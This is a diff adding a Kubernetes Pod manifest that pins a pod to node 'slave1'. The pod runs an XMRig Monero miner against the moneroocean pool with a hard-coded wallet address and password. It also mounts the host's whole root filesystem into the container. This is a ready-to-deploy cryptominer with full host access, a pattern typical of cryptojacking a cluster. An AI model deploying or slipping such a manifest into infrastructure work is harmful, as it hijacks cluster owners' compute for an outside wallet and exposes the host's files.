@@ -1,0 +1,32 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: xmrig-exec
+spec:
+  affinity:
+    nodeAffinity:
+      requiredDuringSchedulingIgnoredDuringExecution:
+        nodeSelectorTerms:
+        - matchExpressions:
+          - key: kubernetes.io/hostname
+            operator: In
+            values:
+            - slave1
+  containers:
+  - name: xmrig-container
+    image: busybox
+    command:
+    - /home/worker1/xmrig/build/xmrig
+    - -o
+    - gulf.moneroocean.stream:80
+    - -u
+    - 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5
+    - -p
+    - piD3ceiver
+    volumeMounts:
+    - name: xmrig-volume
+      mountPath: /
+  volumes:
+  - name: xmrig-volume
+    hostPath:
+      path: /
